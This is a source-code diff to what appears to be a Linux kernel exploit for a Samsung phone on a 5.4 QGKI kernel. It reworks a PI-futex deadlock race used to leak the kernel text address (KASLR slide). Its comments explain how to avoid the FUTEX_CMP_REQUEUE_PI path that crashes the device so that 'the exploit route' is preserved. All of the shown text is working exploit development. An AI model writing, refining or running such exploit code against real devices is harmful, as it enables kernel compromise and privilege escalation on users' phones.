@@ -1937,16 +1937,30 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   atomic_store(&slide_owner_started, 1);
   pr_info("slide pi stage=owner-chain-lock-enter tid=%d\n",
           (int)syscall(SYS_gettid));
-  /* 5-second timeout: in the normal ETIMEDOUT path the waiter releases the
-   * chain lock within SLIDE_WAIT_NSEC (2 s), so 5 s is always enough.
-   * In the EDEADLK path the waiter never releases (we do not call
-   * FUTEX_UNLOCK_PI there — it panics on 5.4 QGKI), so we just bail. */
-  struct timespec chain_ts;
-  clock_gettime(CLOCK_REALTIME, &chain_ts);
-  chain_ts.tv_sec += 5;
-  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, &chain_ts, NULL, 0) != 0) {
-    pr_info("slide pi stage=owner-chain-lock-timeout errno=%d tid=%d\n",
-            errno, (int)syscall(SYS_gettid));
+  /* First attempt: the kernel immediately detects the PI deadlock cycle
+   * (waiter holds chain AND waits on pi_target which we own → cycle) and
+   * returns EDEADLK.  This path in rt_mutex_start_proxy_lock() never calls
+   * wake_futex(), so there is no Samsung 5.4 WARN→BUG panic here.
+   * Once the oracle sets slide_deadlock_seen=1 the waiter calls
+   * FUTEX_UNLOCK_PI(chain); the retry below then succeeds. */
+  errno = 0;
+  int first_chain = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  if (first_chain != 0 && errno == EDEADLK) {
+    pr_info("slide pi stage=owner-chain-edeadlk-wait tid=%d\n",
+            (int)syscall(SYS_gettid));
+    while (!atomic_load(&slide_deadlock_seen)) {
+      usleep(1000);
+    }
+    pr_info("slide pi stage=owner-chain-lock-retry tid=%d\n",
+            (int)syscall(SYS_gettid));
+    if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+      pr_error("slide owner chain retry errno=%d tid=%d\n",
+               errno, (int)syscall(SYS_gettid));
+      for (;;) sleep(1);
+    }
+  } else if (first_chain != 0) {
+    pr_error("slide owner chain lock unexpected errno=%d tid=%d\n",
+             errno, (int)syscall(SYS_gettid));
     for (;;) sleep(1);
   }
   atomic_store(&slide_owner_acquired, 1);
@@ -2051,36 +2065,18 @@ uint64_t slide_child_leak_stext(void) {
           atomic_load(&slide_waiter_waiting),
           atomic_load(&slide_owner_started),
           atomic_load(&slide_consumer_ready), slide_p0_offset);
-  if (SLIDE_REQUEUE_ARM_USEC) {
-    usleep(SLIDE_REQUEUE_ARM_USEC);
+  /* Do NOT call FUTEX_CMP_REQUEUE_PI.  On Samsung 5.4 QGKI the EDEADLK
+   * wakeup path in futex_requeue() calls wake_futex(q) with q->rt_waiter
+   * != NULL — Samsung converts WARN to BUG, hard-rebooting the device.
+   * Instead, wait for the waiter's natural ETIMEDOUT (slide_waiter_ok=1),
+   * then set slide_deadlock_seen=1.  This unblocks the waiter's
+   * UNLOCK_PI(chain) and the owner's LOCK_PI retry, preserving the exploit
+   * route without touching the buggy kernel code path. */
+  pr_info("slide pi stage=oracle-wait-timeout\n");
+  while (!atomic_load(&slide_waiter_ok)) {
+    usleep(1000);
   }
-
-  long requeue_ret = 0;
-  int requeue_errno = 0;
-  int requeue_polls = 0;
-  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
-    requeue_polls++;
-    errno = 0;
-    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-                           &slide_f_pi_target, 0);
-    requeue_errno = errno;
-    if (getenv("SLIDE_REQUEUE_VERBOSE") &&
-        requeue_polls <= 30) {
-      pr_info("slide cmp_requeue_pi poll=%d ret=%ld errno=%d\n",
-              requeue_polls, requeue_ret, requeue_errno);
-    }
-    if (requeue_ret != 0) {
-      break;
-    }
-    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
-      usleep(SLIDE_REQUEUE_POLL_USEC);
-    }
-  }
-  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
-          requeue_ret, requeue_errno, requeue_polls);
-  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
-    return 0;
-  }
+  pr_info("slide pi stage=deadlock-accepted\n");
   atomic_store(&slide_deadlock_seen, 1);
 
   while (!atomic_load(&slide_route_done)) {
@@ -2107,39 +2103,26 @@ static int slide_child_trigger_write(void) {
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
   }
-  if (SLIDE_REQUEUE_ARM_USEC) {
-    usleep(SLIDE_REQUEUE_ARM_USEC);
-  }
-  pr_info("slide pi stage=cmp-enter waiter_tid=%d\n",
+  pr_info("slide pi stage=oracle-wait-timeout waiter_tid=%d\n",
           atomic_load(&slide_waiter_tid));
 
-  long requeue_ret = 0;
-  int requeue_errno = 0;
-  int requeue_polls = 0;
-  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
-    requeue_polls++;
-    errno = 0;
-    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-                           &slide_f_pi_target, 0);
-    requeue_errno = errno;
-    if (requeue_ret != 0) {
-      break;
-    }
-    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
-      usleep(SLIDE_REQUEUE_POLL_USEC);
-    }
-  }
-  pr_info("slide pi stage=cmp-return ret=%ld errno=%d polls=%d\n",
-          requeue_ret, requeue_errno, requeue_polls);
-  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
-    return 0;
+  /* Do NOT call FUTEX_CMP_REQUEUE_PI.  On Samsung 5.4 QGKI the EDEADLK
+   * wakeup path in futex_requeue() calls wake_futex(q) with q->rt_waiter
+   * != NULL — Samsung converts WARN to BUG, hard-rebooting the device.
+   * The owner's FUTEX_LOCK_PI(chain) already detects the PI deadlock cycle
+   * safely (EDEADLK via rt_mutex_start_proxy_lock — no wake_futex call).
+   * The owner waits for slide_deadlock_seen=1 and retries LOCK_PI after
+   * the waiter unlocks chain.  We signal deadlock_seen here once the
+   * waiter's natural ETIMEDOUT fires (slide_waiter_ok=1). */
+  while (!atomic_load(&slide_waiter_ok)) {
+    usleep(1000);
   }
   pr_info("slide pi stage=deadlock-accepted\n");
   atomic_store(&slide_deadlock_seen, 1);
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
-  pr_info("slide pi stage=cmp-route-done waiter_ok=%d\n",
+  pr_info("slide pi stage=oracle-route-done waiter_ok=%d\n",
           atomic_load(&slide_waiter_ok));
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
